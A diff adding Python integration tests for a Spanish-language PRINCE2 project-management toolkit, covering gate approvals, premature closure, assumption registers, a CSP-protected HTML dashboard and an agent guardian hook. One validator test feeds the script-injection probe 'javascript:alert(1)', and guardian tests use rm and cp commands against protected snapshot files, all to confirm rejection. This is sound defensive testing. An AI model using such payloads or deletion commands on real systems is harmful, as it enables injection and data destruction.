+          and rp.returncode == 0 and pp.get("tipo") == "autorizar-proyecto" and "open conditions from earlier gates" not in (pp.get("condiciones") or ""), det(rp) + " | " + str(pp)[:300])
+    pm = py(PU, "--proyecto", "en1", "estado", "--markdown")
+    check("C3-10 puertas.py estado --markdown en inglés: «### Gates and verification», «**Next gate: …»** y etiquetas en inglés",
+          pm.stdout.startswith("### Gates and verification") and "**Next gate: autorizar-etapa**" in pm.stdout and "(open)" in pm.stdout
+          and not [l for l in pm.stdout.splitlines() if IDH.idioma_de(sin_citas(l)) == "es"], pm.stdout[:500])
+    # CAM-03 en inglés: el radar reconoce la reserva de riesgo por el mensaje en inglés
+    py(ES, "--proyecto", "en1", "presupuesto", "riesgo=1000", "--por", "Ejecutiva: Laura Méndez")
+    rc = py(RG, "--proyecto", "en1", "agregar", "cambios", "--campo", "titulo=Proveedor alternativo", "--campo", "descripcion=Responde a R-001", "--campo", "decision=aprobado",
+            "--campo", "estado=aprobado", "--campo", "costo=900", "--campo", "cargo=reserva-riesgo", "--campo", "decidido_por=Ejecutiva: Laura Méndez")
+    s3 = [h for h in js(py(SA, "--proyecto", "en1", "--json", "--corte", "2026-10-21")).get("hallazgos", []) if h["codigo"] == "CAM-03"]
+    rd = js(py(ES, "--proyecto", "en1", "radar", "--json", "--corte", "2026-10-21", "--max", "0"))
+    c3r = [x for v in rd.get("items", {}).values() for x in v if x.get("regla") == "CAM-03"]
+    check("C3-11 CAM-03 en inglés («Risk reserve at 90 % (900 of 1,000)», miles con coma) y el radar lo asigna a reserva-riesgo, como en español",
+          rc.returncode == 0 and s3 and s3[0]["mensaje"] == "Risk reserve at 90 % (900 of 1,000)." and c3r and c3r[0]["id"] == "reserva-riesgo",
+          det(rc) + " | " + json.dumps(s3 + c3r, ensure_ascii=False)[:400])
+
+    # --- 2 · plan de excepción durante un cierre prematuro (PRINCE2 CP, preparar el cierre prematuro)
+    g = "pre"
+    py(NP, "--ruta", g, "--nombre", "Pre", "--fecha", "2026-10-01", "--ejecutivo", "Laura Méndez", "--gestor", "Martín Suárez")
+    py(ES, "--proyecto", g, "tolerancia", "--nivel", "proyecto", "tiempo=1mes", "costo=10%")
+    junta(g, "autorizar-inicio", d, arts=[("project-brief", "01-inicio/project-brief.md")])
+    py(ES, "--proyecto", g, "puerta", "autorizar-inicio", "--decision", "aprobado", "--por", JUNTA, "--fecha", "2026-10-05")
+    junta(g, "autorizar-proyecto", d, arts=[("pid", "00-direccion/pid.md"), ("business-case", "00-direccion/business-case.md"), ("plan-proyecto", "02-planificacion/plan-proyecto.md")])
+    py(ES, "--proyecto", g, "puerta", "autorizar-proyecto", "--decision", "aprobado", "--por", JUNTA, "--fecha", "2026-10-20")
+    junta(g, "autorizar-etapa", d, arts=[("plan-etapa-2", "02-planificacion/plan-etapa-2.md")])
+    py(ES, "--proyecto", g, "puerta", "autorizar-etapa", "--decision", "aprobado", "--por", JUNTA, "--fecha", "2026-10-21", "--tol", "costo=5%", "tiempo=1sem")
+    shutil.copytree(os.path.join(d, g), os.path.join(d, "plan"))      # mismo proyecto para el cierre planificado
+    py(ES, "--proyecto", g, "puerta", "decision-ad-hoc", "--decision", "aprobado", "--por", JUNTA, "--fecha", "2026-11-02", "--motivo", "cierre prematuro: el socio retiró el patrocinio")
+    dcp = est(g)["puertas"][-1].get("decision_id", "")
+    py(ES, "--proyecto", g, "cierre", "--prematuro", "--decision", dcp)
+    n0 = len(filas(g, "decisiones"))
+    r0 = py(ES, "--proyecto", g, "puerta", "autorizar-plan-excepcion", "--decision", "aprobado", "--por", JUNTA, "--fecha", "2026-11-04")
+    check("C3-12 cierre prematuro: autorizar-plan-excepcion corresponde en CP (no pide --forzar) y sin plan registrado lo bloquea X-01; el proyecto sigue en CP sin decisión nueva",
+          r0.returncode != 0 and "falta el plan de excepción (plan-excepcion-X-###)" in r0.stderr and "no corresponde" not in r0.stderr and (est(g)["fase"], est(g)["proceso_actual"]) == ("cierre", "CP")
+          and len(filas(g, "decisiones")) == n0, det(r0))
+    junta(g, "autorizar-plan-excepcion", d, arts=[("plan-excepcion-X-001", "02-planificacion/plan-excepcion-X-001.md"),
+                                                  ("informe-excepcion-X-001", "03-control/reportes/informe-excepcion-X-001.md")])
+    r1 = py(ES, "--proyecto", g, "puerta", "autorizar-plan-excepcion", "--decision", "aprobado", "--por", JUNTA, "--fecha", "2026-11-05")
+    e = est(g); ds = filas(g, "decisiones"); cp = e.get("cierre_prematuro") or {}; pe = cp.get("plan_excepcion") or {}
+    dpe = e["puertas"][-1].get("decision_id", "")
+    check("C3-13 plan de excepción aprobado en el cierre prematuro sin --forzar: sigue en cierre/CP, D-### de nivel junta, plan asociado al cierre (cierre_prematuro.plan_excepcion y el artefacto)",
+          r1.returncode == 0 and (e["fase"], e["proceso_actual"]) == ("cierre", "CP") and not e["puertas"][-1].get("forzada") and dpe and ds[-1]["id"] == dpe
+          and ds[-1]["nivel"] == "junta" and ds[-1]["decision"].startswith("autorizar-plan-excepcion: aprobado") and cp.get("decision") == dcp
+          and pe.get("artefacto") == "plan-excepcion-X-001" and pe.get("decision") == dpe and pe.get("estado") == "aprobado"
+          and (e["artefactos"]["plan-excepcion-X-001"].get("cierre_prematuro") or {}).get("decision") == dpe and "C-09" in r1.stdout, det(r1))
+    junta(g, "autorizar-cierre", d, arts=[("inventario-cierre-prematuro", "04-cierre/inventario-cierre-prematuro.md"), ("informe-fin-proyecto", "04-cierre/informe-fin-proyecto.md"),
+                                          ("registro-aceptacion", "04-cierre/registro-aceptacion.md"), ("recomendaciones-seguimiento", "04-cierre/recomendaciones-seguimiento.md"),
+                                          ("informe-lecciones", "04-cierre/informe-lecciones.md"), ("plan-revision-beneficios", "04-cierre/plan-revision-beneficios.md")])
+    v = js(py(PU, "--proyecto", g, "verificar", "autorizar-cierre", "--json"))
+    c09 = [h for h in v.get("hallazgos", []) if h["id"] == "C-09"]
+    r2 = py(ES, "--proyecto", g, "puerta", "autorizar-cierre", "--decision", "aprobado", "--por", JUNTA, "--fecha", "2026-11-20")
+    pmk = py(PU, "--proyecto", g, "estado", "--markdown")
+    check("C3-14 autorizar-cierre con el plan de excepción del cierre sin completar: C-09 bloqueo (único bloqueo) y 'aprobado' rechazado; sigue en CP; el Markdown de estado muestra el plan",
+          c09 and c09[0]["severidad"] == "bloqueo" and "plan-excepcion-X-001" in c09[0]["mensaje"] and [h["id"] for h in v["hallazgos"] if h["severidad"] == "bloqueo"] == ["C-09"]
+          and r2.returncode != 0 and "plan de excepción del cierre prematuro" in r2.stderr and est(g)["fase"] == "cierre"
+          and "Plan de excepción del cierre: plan-excepcion-X-001" in pmk.stdout, json.dumps(v.get("hallazgos", []), ensure_ascii=False)[:500] + " | " + det(r2))
+    cmd = f"python3 {os.path.join(S, 'estado.py')} --proyecto {g} cierre --plan-excepcion completado --por \"{JUNTA}\""
+    neg = lambda agente: "deny" in py(GD, entrada=json.dumps({"tool_name": "Bash", "tool_input": {"command": cmd}, **({"agent_type": agente} if agente else {})})).stdout
+    check("C3-15 guardián: estado.py cierre --plan-excepcion está reservado a pm-director (hilo principal y pm-cierre: negado; pm-director: permitido)",
+          neg(None) and neg("pm-method:pm-cierre") and not neg("pm-method:pm-director"))
+    rs = [py(ES, "--proyecto", g, "cierre", "--plan-excepcion", "completado"), py(ES, "--proyecto", "plan", "cierre", "--plan-excepcion", "completado", "--por", JUNTA)]
+    check("C3-16 cierre --plan-excepcion sin --por, o sin plan del cierre prematuro (proyecto en entrega): rechazado con mensaje claro y sin traza",
+          all(x.returncode != 0 and "Traceback" not in x.stderr for x in rs) and "--por" in rs[0].stderr and "autorizar-plan-excepcion" in rs[1].stderr
+          and (est(g).get("cierre_prematuro") or {}).get("plan_excepcion", {}).get("estado") == "aprobado", det(*rs))
+    r3 = py(ES, "--proyecto", g, "cierre", "--plan-excepcion", "completado", "--por", JUNTA, "--fecha", "2026-11-18", "--nota", "módulo de pagos en estado seguro")
+    pe = (est(g).get("cierre_prematuro") or {}).get("plan_excepcion") or {}; ds = filas(g, "decisiones")
+    v = js(py(PU, "--proyecto", g, "verificar", "autorizar-cierre", "--json"))
+    r4 = py(ES, "--proyecto", g, "puerta", "autorizar-cierre", "--decision", "aprobado", "--por", JUNTA, "--fecha", "2026-11-20")
+    check("C3-17 plan completado (--por, D-### de nivel junta, fecha y nota): C-09 desaparece y autorizar-cierre se registra → cerrado",
+          r3.returncode == 0 and pe.get("estado") == "completado" and pe.get("fecha_fin") == "2026-11-18" and pe.get("decision_fin") and ds and ds[-1]["id"] == pe.get("decision_fin")
+          and ds[-1]["nivel"] == "junta" and not [h for h in v.get("hallazgos", []) if h["id"] == "C-09"] and r4.returncode == 0 and est(g)["fase"] == "cerrado", det(r3, r4))
+    # fuera de un cierre prematuro, sin cambios: en un cierre planificado exige --forzar y, aprobado, vuelve a entrega/CS
+    py(ES, "--proyecto", "plan", "limite-etapa"); py(ES, "--proyecto", "plan", "cierre")
+    junta("plan", "autorizar-plan-excepcion", d, arts=[("plan-excepcion-X-001", "02-planificacion/plan-excepcion-X-001.md")])
+    r5 = py(ES, "--proyecto", "plan", "puerta", "autorizar-plan-excepcion", "--decision", "aprobado", "--por", JUNTA, "--fecha", "2026-11-05")
+    r6 = py(ES, "--proyecto", "plan", "puerta", "autorizar-plan-excepcion", "--decision", "aprobado", "--por", JUNTA, "--fecha", "2026-11-05", "--forzar")
+    ep = est("plan")
+    check("C3-18 cierre planificado (sin cierre_prematuro): autorizar-plan-excepcion sigue sin corresponder (exige --forzar) y con --forzar vuelve a entrega/CS, sin plan asociado",
+          r5.returncode != 0 and "no corresponde" in r5.stderr and r6.returncode == 0 and (ep["fase"], ep["proceso_actual"]) == ("entrega", "CS")
+          and not ep.get("cierre_prematuro"), det(r5, r6))
+
+    # --- 3 · supuesto transferido: destino obligatorio y existente
+    g = "sup"
+    py(NP, "--ruta", g, "--nombre", "Sup", "--fecha", "2026-10-01", "--ejecutivo", "Laura Méndez", "--gestor", "Martín Suárez")
+    sid = ultimo_id(py(RG, "--proyecto", g, "agregar", "supuestos", "--campo", "supuesto_o_restriccion=El proveedor entrega en 30 días", "--campo", "tipo=supuesto"))
+    rid = ultimo_id(py(RG, "--proyecto", g, "agregar", "riesgos", "--campo", "evento=Atraso del proveedor", "--campo", "tipo=amenaza", "--campo", "probabilidad=3",
+                       "--campo", "impacto=3", "--campo", f"notas=origen {sid}"))
+    iid = ultimo_id(py(RG, "--proyecto", g, "agregar", "issues", "--campo", "tipo=problema-preocupacion", "--campo", "titulo=Proveedor sin stock", "--campo", "responsable=Martín Suárez"))
+    antes = filas(g, "supuestos")
+    malos = [py(RG, "--proyecto", g, "agregar", "supuestos", "--campo", "supuesto_o_restriccion=Sin destino", "--campo", "estado=transferido"),
+             py(RG, "--proyecto", g, "agregar", "supuestos", "--campo", "supuesto_o_restriccion=Sin destino", "--campo", "estado=transferido", "--campo", "notas=pasa a riesgos", "--forzar"),
+             py(RG, "--proyecto", g, "actualizar", "supuestos", sid, "--campo", "estado=transferido", "--campo", "notas=→ R-099"),
+             py(RG, "--proyecto", g, "actualizar", "supuestos", sid, "--campo", "estado=transferido", "--campo", "notas=→ I-077", "--forzar"),
+             py(RG, "--proyecto", g, "proponer", "supuestos", sid, "--campo", "estado=transferido", "--por", "agente: pm-riesgos")]
+    check("C3-19 supuesto transferido sin destino (alta, también con --forzar) o con destino inexistente (R-099, I-077 con --forzar) y propuesta sin destino: rechazados, registro intacto y sin propuesta",
+          all(x.returncode != 0 and "Traceback" not in x.stderr and "transferido" in x.stderr for x in malos) and "--forzar" in malos[0].stderr
+          and "R-099" in malos[2].stderr and "riesgos.csv" in malos[2].stderr and "I-077" in malos[3].stderr and "issues.csv" in malos[3].stderr
+          and filas(g, "supuestos") == antes and not glob.glob(os.path.join(d, g, "03-control", "propuestas", "P-*.json")), det(*malos))
+    ok1 = py(RG, "--proyecto", g, "actualizar", "supuestos", sid, "--campo", "estado=transferido", "--campo", f"notas=→ {rid}")
+    ok2 = py(RG, "--proyecto", g, "agregar", "supuestos", "--campo", "supuesto_o_restriccion=Hay stock", "--campo", "estado=transferido", "--campo", f"notas=→ {iid} (ya afecta)")
+    check("C3-20 supuesto transferido con destino existente (→ R-### al actualizar, → I-### al agregar): aceptado",
+          ok1.returncode == 0 and ok2.returncode == 0 and {f["id"]: f["estado"] for f in filas(g, "supuestos")}.get(sid) == "transferido", det(ok1, ok2))
+    p_ = os.path.join(d, g, "03-control", "registros", "supuestos.csv")
+    cols = list(csv.DictReader(open(p_, encoding="utf-8", newline="")).fieldnames)
+    n = len(filas(g, "supuestos"))
+    sx, sy = f"S-{n + 1:03d}", f"S-{n + 2:03d}"
+    with open(p_, "a", encoding="utf-8", newline="") as fh:
+        w = csv.DictWriter(fh, cols, lineterminator="\r\n")
+        w.writerow({**{c: "" for c in cols}, "id": sx, "fecha": "2026-10-02", "supuesto_o_restriccion": "Heredado sin destino", "tipo": "supuesto", "estado": "transferido"})
+        w.writerow({**{c: "" for c in cols}, "id": sy, "fecha": "2026-10-02", "supuesto_o_restriccion": "Heredado con destino roto", "tipo": "supuesto", "estado": "transferido", "notas": "→ R-077"})
+    s4 = [h for h in js(py(SA, "--proyecto", g, "--json", "--corte", "2026-10-03")).get("hallazgos", []) if h["codigo"] == "SUP-04"]
+    check(f"C3-21 sanidad sobre datos ya existentes: SUP-04 AVISO para {sx} (sin destino) y {sy} (R-077 no existe), no para los transferidos con destino válido",
+          sorted(re.findall(r"S-\d{3}", " ".join(h["mensaje"] for h in s4))) == [sx, sy] and all(h["severidad"] == "AVISO" for h in s4)
+          and any("R-077" in h["mensaje"] for h in s4), json.dumps(s4, ensure_ascii=False)[:400])
+    ra = py(RG, "--proyecto", g, "actualizar", "supuestos", sx, "--campo", "responsable=Martín Suárez")
+    rb = py(RG, "--proyecto", g, "actualizar", "supuestos", sx, "--campo", f"notas=→ {rid}")
+    s4b = [h for h in js(py(SA, "--proyecto", g, "--json", "--corte", "2026-10-03")).get("hallazgos", []) if h["codigo"] == "SUP-04"]
+    check("C3-22 la fila heredada admite cambios en otras columnas; al indicar un destino válido sale de SUP-04",
+          ra.returncode == 0 and rb.returncode == 0 and not any(sx in h["mensaje"] for h in s4b) and any(sy in h["mensaje"] for h in s4b), det(ra, rb))
+    py(ES, "--proyecto", g, "set", "idioma=en")
+    re_ = py(RG, "--proyecto", g, "actualizar", "supuestos", sy, "--campo", "notas=→ R-088")
+    s4c = [h for h in js(py(SA, "--proyecto", g, "--json", "--corte", "2026-10-03")).get("hallazgos", []) if h["codigo"] == "SUP-04"]
+    check("C3-23 en un proyecto en inglés: el rechazo y SUP-04 salen en inglés",
+          re_.returncode != 0 and "Assumption" in re_.stderr and "--forzar does not override it" in re_.stderr
+          and s4c and s4c[0]["mensaje"].startswith(f"Assumption {sy} transferred to R-077"), det(re_) + " | " + json.dumps(s4c, ensure_ascii=False)[:300])
+
+
+def _arbol(p):
+    """{ruta relativa: sha256 o 'dir'} de toda la carpeta, incluidos los ocultos (.pm-bloqueo, .bitacora.jsonl)."""
+    import hashlib
+    out = {}
+    for raiz, dirs, archivos in os.walk(p):
+        for x in dirs: out[os.path.relpath(os.path.join(raiz, x), p)] = "dir"
+        for x in archivos:
+            q = os.path.join(raiz, x)
+            with open(q, "rb") as fh: out[os.path.relpath(q, p)] = hashlib.sha256(fh.read()).hexdigest()
+    return out
+
+def caso_tablero(tmp):
+    """TB: tablero del proyecto (tablero.py, SPEC §1.10.17): generar pm-tablero/1 con refs estables y sin montos ni datos
+    de interesados, sin escribir; HTML con CSP por hash; congelado automático en cada puerta (estado previo a la decisión)
+    y en el cierre prematuro, aviso si falla; congelado manual inmutable; listar y comparar; guardián; carpeta de solo
+    lectura (lecturas sin bloqueo ni escrituras; sanidad sin --reparar no crea registros); proyecto en inglés."""
+    print("\n== TB · tablero del proyecto: generar, HTML con CSP, congelado en cada puerta, inmutable, comparar y solo lectura")
+    import base64, hashlib
+    d = os.path.join(tmp, "tb"); os.makedirs(d)
+    ES, RG, SA, NP, PU_ = (os.path.join(S, x) for x in ("estado.py", "registro.py", "sanidad.py", "nuevo_proyecto.py", "puertas.py"))
+    TB = os.path.join(S, "tablero.py"); GD = os.path.join(RAIZ, "hooks", "guardian.py")
+    def py(script, *args, cwd=None):
+        return subprocess.run([sys.executable, script] + list(args), cwd=cwd or d, capture_output=True, text=True, encoding="utf-8", errors="replace")
+    def js(r):
+        try: return json.loads(r.stdout)
+        except ValueError: return {}
+    def est(g): return json.load(open(os.path.join(d, g, "estado.json"), encoding="utf-8"))
+    det = lambda *rs: " || ".join(f"rc={r.returncode} {(r.stdout + r.stderr)[-300:]!r}" for r in rs)
+    tableros = lambda g: sorted(glob.glob(os.path.join(d, g, "03-control", "reportes", "tableros", "*.json")))
+    def cartas(t_):
+        cs = [c for col in t_["ciclo"]["columnas"] for c in (col.get("decisiones") or []) + (col.get("eventos") or []) + ([col["tarjeta"]] if col.get("tarjeta") else [])]
+        cs += t_["atencion"]["items"] + t_["entrega"]["productos"]["tarjetas"] + list(t_["artefactos"]["elementos"].values())
+        cs += [c for v in t_["entrega"]["control"].values() for c in v["tarjetas"] + v["propuestas"]]
+        return cs
+    JUNTA = "Junta: Laura Méndez (ejecutiva)"
+
+    # --- 1 · generar: formato, refs estables, textos limpios, sin escrituras
+    g = "g"
+    py(NP, "--ruta", g, "--nombre", "Portal", "--fecha", "2026-10-01", "--ejecutivo", "Laura Méndez", "--gestor", "Martín Suárez")
+    py(RG, "--proyecto", g, "agregar", "acciones", "--campo", "descripcion=Revisar el contrato de 12.500 dólares", "--campo", "responsable=Ana Pérez", "--campo", "fecha_compromiso=2026-10-05")
+    py(RG, "--proyecto", g, "agregar", "cambios", "--campo", "titulo=Agregar pagos", "--campo", "solicitante=Ana Pérez", "--campo", "costo=15000", "--campo", "estado=pendiente-decision")
+    py(RG, "--proyecto", g, "agregar", "stakeholders", "--campo", "nombre=Persona Reservada", "--campo", "rol_proyecto=usuario")
+    py(RG, "--proyecto", g, "proponer", "issues", "--campo", "titulo=Proveedor sin stock", "--campo", "tipo=problema-preocupacion", "--por", "agente: pm-control-etapa", "--motivo", "visto en la reunión")
+    shutil.rmtree(os.path.join(d, g, ".pm-bloqueo"), ignore_errors=True)
+    antes = _arbol(os.path.join(d, g))
+    r1, r2 = py(TB, "--proyecto", g, "generar", "--json", "--corte", "2026-10-20"), py(TB, "generar", "--proyecto", g, "--json", "--corte", "2026-10-20")
+    t1, t2 = js(r1), js(r2)
+    claves = {"formato", "proyecto", "idioma", "corte", "generado", "huella", "n_bitacora", "instantanea", "ciclo", "atencion", "entrega", "artefactos", "eventos", "avisos"}
+    cs = cartas(t1) if t1 else []
+    forma = {"ref", "tipo", "nombre", "descripcion", "estado", "columna", "responsable", "fecha", "senales", "enlace", "fuente"}
+    check("TB-01 generar --json (con --proyecto antes o después del subcomando): pm-tablero/1 con las claves de primer nivel, instantanea null y sin avisos",
+          r1.returncode == 0 and r2.returncode == 0 and claves <= set(t1) and t1["formato"] == "pm-tablero/1" and t1["instantanea"] is None
+          and t1["corte"] == "2026-10-20" and t1["idioma"] == "es" and not t1["avisos"] and set(t1["entrega"]["control"]) == {"cambios", "issues", "acciones"}, det(r1))
+    refs = lambda t_: sorted(c["ref"] for c in cartas(t_))
+    check("TB-02 cada tarjeta tiene la forma común (ref, nombre ≤ 80, descripción ≤ 140, enlace ficha/<ref>) y las refs son estables entre dos corridas",
+          cs and all(forma <= set(c) and len(c["nombre"]) <= 80 and len(c["descripcion"]) <= 140 and c["enlace"].startswith("ficha/") for c in cs)
+          and refs(t1) == refs(t2) and {"A-001", "C-001", "P-001", "puerta:autorizar-inicio:0"} <= set(refs(t1))
+          and t1["huella"] == t2["huella"], json.dumps(cs[:2], ensure_ascii=False)[:400])
+    texto = json.dumps(t1, ensure_ascii=False)
+    acc = next((c for c in t1["entrega"]["control"]["acciones"]["tarjetas"] if c["ref"] == "A-001"), {})
+    check("TB-03 sin montos (12.500, 15000 → [monto]) ni datos de interesados (eventos sin stakeholders, sin el nombre); acción vencida y propuesta como sombra",
+          "12.500" not in texto and "15000" not in texto and "[monto]" in texto and "Persona Reservada" not in texto
+          and not any(e_["registro"] == "stakeholders" or "stakeholders" in e_["archivo"] for e_ in t1["eventos"])
+          and "vencida" in acc.get("senales", []) and t1["entrega"]["control"]["issues"]["propuestas"][0]["ref"] == "P-001", texto[:300])
+    r3 = py(TB, "--proyecto", g, "generar")
+    check("TB-04 generar (resumen) y generar --json no escriben nada en la carpeta: ni .pm-bloqueo/ ni bitácora",
+          r3.returncode == 0 and "pm-tablero/1" in r3.stdout and _arbol(os.path.join(d, g)) == antes, det(r3))
+
+    # --- 2 · HTML autocontenido con CSP por hash
+    h = os.path.join(d, "salida", "tablero.html")
+    r = py(TB, "--proyecto", g, "generar", "--html", h, "--origen", "https://portal.ejemplo:8443/")
+    doc = open(h, encoding="utf-8").read() if os.path.exists(h) else ""
+    meta = re.search(r'<meta http-equiv="Content-Security-Policy" content="([^"]+)">', doc)
+    guion = re.search(r"<script>(.*?)</script>", doc, re.S); estilo = re.search(r"<style>(.*?)</style>", doc, re.S)
+    hs = lambda x: base64.b64encode(hashlib.sha256(x.encode("utf-8")).digest()).decode()
+    pol = meta.group(1) if meta else ""
+    datos = re.search(r'<script type="application/json" id="datos-tablero">(.*?)</script>', doc, re.S)
+    vinc = re.search(r'<script type="application/json" id="vinculos-tablero">(.*?)</script>', doc, re.S)
+    check("TB-05 HTML: la CSP autoriza exactamente el script y el estilo en línea por su sha256 (default-src 'none', sin unsafe-*), datos JSON válidos y origen normalizado",
+          r.returncode == 0 and guion and estilo and f"script-src 'sha256-{hs(guion.group(1))}'" in pol and f"style-src 'sha256-{hs(estilo.group(1))}'" in pol
+          and "default-src 'none'" in pol and "unsafe" not in pol and doc.count("<script>") == 1 and datos and json.loads(datos.group(1))["formato"] == "pm-tablero/1"
+          and json.loads(vinc.group(1))["origen"] == "https://portal.ejemplo:8443" and "no se actualiza" in doc, det(r) + pol[:200])
+    malos = [py(TB, "--proyecto", g, "generar", "--html", os.path.join(d, g, "03-control", "reportes", "tableros", "x.html")),
+             py(TB, "--proyecto", g, "generar", "--html", h, "--origen", "javascript:alert(1)"), py(TB, "--proyecto", g, "generar", "--corte", "2026-13-01")]
+    check("TB-06 --html hacia 03-control/reportes/tableros/, --origen que no es http(s) y --corte inválida: rechazados con mensaje y sin traza",
+          all(x.returncode != 0 and "Traceback" not in x.stderr for x in malos) and not tableros(g), det(*malos))
+    try:
+        from playwright.sync_api import sync_playwright
+        with sync_playwright() as pw:
+            b = pw.chromium.launch(); pg = b.new_page(viewport={"width": 390, "height": 800}); errores = []
+            pg.on("pageerror", lambda x: errores.append(str(x)))
+            pg.add_init_script("window.__csp = []; document.addEventListener('securitypolicyviolation', function (e) { window.__csp.push(e.violatedDirective); });")
+            pg.goto("file://" + os.path.abspath(h)); pg.wait_for_load_state("load")
+            for v in ("atencion", "entrega", "artefactos", "ciclo"): pg.click(f"button[data-vista={v}]")
+            viol, ancho, enlace = pg.evaluate("window.__csp"), pg.evaluate("document.documentElement.scrollWidth"), pg.get_attribute("a.tarjeta", "href") or ""
+            b.close()
+        check("TB-07 HTML en Chromium (móvil): dibuja las cuatro vistas sin violaciones de CSP ni errores, sin desborde horizontal y con enlaces al portal",
+              not viol and not errores and ancho <= 390 and enlace.startswith("https://portal.ejemplo:8443/p/Portal/ficha/"), f"{viol} {errores[:2]} {ancho} {enlace}")
+    except ImportError:
+        omitir("tablero en navegador: falta playwright para Python")
+    except Exception as x:
+        omitir(f"tablero en navegador: Chromium no arrancó: {str(x).splitlines()[0][:120]}")
+
+    # --- 3 · congelado automático en cada puerta: el estado previo a la decisión, con la decisión
+    junta(g, "autorizar-inicio", d, arts=[("project-brief", "01-inicio/project-brief.md")], por=JUNTA)
+    ra = py(ES, "--proyecto", g, "puerta", "autorizar-inicio", "--decision", "aprobado", "--por", JUNTA, "--fecha", "2026-10-05")
+    junta(g, "autorizar-proyecto", d, por=JUNTA)
+    rb = py(ES, "--proyecto", g, "puerta", "autorizar-proyecto", "--decision", "condicionado", "--por", JUNTA, "--fecha", "2026-10-20")
+    rp = py(ES, "--proyecto", g, "puerta", "autorizar-etapa", "--decision", "pendiente", "--por", JUNTA, "--fecha", "2026-10-21")
+    ts = tableros(g); ins = [json.load(open(x, encoding="utf-8")) for x in ts]
+    i0 = ins[0] if ins else {}; i1 = ins[1] if len(ins) > 1 else {}
+    ok_prev = (i0.get("ciclo", {}).get("fase") == "pre-proyecto" and i1.get("ciclo", {}).get("fase") == "inicio"
+               and any(c.get("tarjeta", {}).get("ref") == "puerta:autorizar-inicio:0" for c in i0.get("ciclo", {}).get("columnas", []))
+               and any(x["ref"] == "puerta:autorizar-inicio:0" and x["decision"] == "aprobado" for c in i1.get("ciclo", {}).get("columnas", []) for x in c.get("decisiones") or []))
+    ins0 = i0.get("instantanea") or {}
+    check("TB-08 cada puerta decidida congela el tablero previo (fase anterior, la puerta como «próxima») con la decisión en `instantanea`; la ref de la próxima es la de la decidida; «pendiente» no congela",
+          ra.returncode == 0 and rb.returncode == 0 and rp.returncode == 0 and [os.path.basename(x) for x in ts] == ["2026-10-05-autorizar-inicio-etapa-0.json", "2026-10-20-autorizar-proyecto-etapa-1.json"]
+          and ins0.get("decision") == "aprobado" and ins0.get("decision_id") == est(g)["puertas"][0].get("decision_id") and ins0.get("puerta") == "autorizar-inicio"
+          and ins0.get("etapa") == 0 and ins0.get("por") == JUNTA and (i1.get("instantanea") or {}).get("decision") == "condicionado" and ok_prev
+          and all(os.path.exists(x[:-5] + ".html") for x in ts) and "Tablero congelado antes de la decisión" in ra.stdout, det(ra, rb))
+    bit = [json.loads(x) for x in open(os.path.join(d, g, ".bitacora.jsonl"), encoding="utf-8")]
+    lt = [x for x in bit if (x.get("archivo") or "").startswith("03-control/reportes/tableros/")]
+    hist = py(RG, "--proyecto", g, "historial", "2026-10-05-autorizar-inicio-etapa-0", "--json")
+    check("TB-09 las instantáneas quedan en la bitácora (json y html, script estado.py, operación puerta, id e etiqueta) y registro.py historial <id> las muestra; cadena íntegra",
+          len(lt) == 4 and all(x["script"] == "estado.py" and x["operacion"] == "puerta" and x.get("instantanea") for x in lt)
+          and lt[0].get("etiqueta") == "autorizar-inicio · etapa 0" and js(hist).get("total") == 2 and not js(hist).get("problemas"), json.dumps(lt[:1], ensure_ascii=False)[:300])
+
+    # --- 4 · congelado manual, inmutable, listar, comparar y guardián
+    py(RG, "--proyecto", g, "agregar", "issues", "--campo", "titulo=Demora del proveedor", "--campo", "tipo=problema-preocupacion", "--campo", "responsable=Martín Suárez")
+    m1 = py(TB, "--proyecto", g, "congelar", "--etiqueta", "Junta de octubre", "--por", "Gestor: Martín Suárez")
+    m2 = py(TB, "--proyecto", g, "congelar", "--etiqueta", "Junta de octubre")
+    li = js(py(TB, "--proyecto", g, "listar", "--json"))
+    hoy = __import__("datetime").date.today().isoformat()
+    ids = [x["id"] for x in li]
+    check("TB-10 congelar manual: <fecha>-<etiqueta>, nunca pisa (-2), con --por; listar las ordena y las da por íntegras contra la bitácora",
+          m1.returncode == 0 and m2.returncode == 0 and f"{hoy}-junta-de-octubre" in ids and f"{hoy}-junta-de-octubre-2" in ids
+          and all(x["en_bitacora"] is True for x in li) and next(x for x in li if x["id"] == f"{hoy}-junta-de-octubre")["por"] == "Gestor: Martín Suárez", det(m1, m2) + str(ids))
+    cmp_ = js(py(TB, "--proyecto", g, "comparar", "2026-10-20-autorizar-proyecto-etapa-1", f"{hoy}-junta-de-octubre", "--json"))
+    cmp2 = py(TB, "--proyecto", g, "comparar", "2026-10-05-autorizar-inicio-etapa-0", "actual")
+    check("TB-11 comparar: la issue nueva entró, la puerta autorizar-proyecto pasó de próxima a decidida (cambió); «actual» como B; id inválido rechazado",
+          any(x["ref"] == "I-001" and x["vista"] == "issues" for x in cmp_.get("entraron", []))
+          and any(x["ref"] == "puerta:autorizar-proyecto:1" and x["de"]["estado"] == "proxima" and x["a"]["estado"] == "condicionado" for x in cmp_.get("cambiaron", []))
+          and cmp2.returncode == 0 and "→ actual" in cmp2.stdout and py(TB, "--proyecto", g, "comparar", "../x", "actual").returncode != 0, json.dumps(cmp_, ensure_ascii=False)[:400])
+    f0 = ts[0]
+    with open(f0, "a", encoding="utf-8") as fh: fh.write(" ")
+    li2 = {x["id"]: x for x in js(py(TB, "--proyecto", g, "listar", "--json"))}
+    b2 = [h_ for h_ in js(py(SA, "--proyecto", g, "--json")).get("hallazgos", []) if h_["codigo"] == "BIT-02" and "tableros/2026-10-05" in h_["mensaje"]]
+    check("TB-12 inmutable: una instantánea editada fuera de los scripts aparece en listar (en_bitacora false) y en la sanidad (BIT-02)",
+          li2["2026-10-05-autorizar-inicio-etapa-0"]["en_bitacora"] is False and b2, str(b2)[:200])
+    rel = os.path.join(d, g, "03-control", "reportes", "tableros", "2026-10-05-autorizar-inicio-etapa-0.json")
+    dec = lambda entrada: subprocess.run([sys.executable, GD], input=json.dumps(entrada), capture_output=True, text=True).stdout
+    check("TB-13 guardián: Write/Edit y cp/rm hacia 03-control/reportes/tableros/ negados; tablero.py congelar permitido",
+          "deny" in dec({"tool_name": "Write", "tool_input": {"file_path": rel}}) and "deny" in dec({"tool_name": "Edit", "tool_input": {"file_path": rel}})
+          and "deny" in dec({"tool_name": "Bash", "tool_input": {"command": f"cp otro.json {rel}"}}) and "deny" in dec({"tool_name": "Bash", "tool_input": {"command": f"rm {rel}"}})
+          and "deny" not in dec({"tool_name": "Bash", "tool_input": {"command": f"python3 {TB} --proyecto {g} congelar --etiqueta x"}}))
+
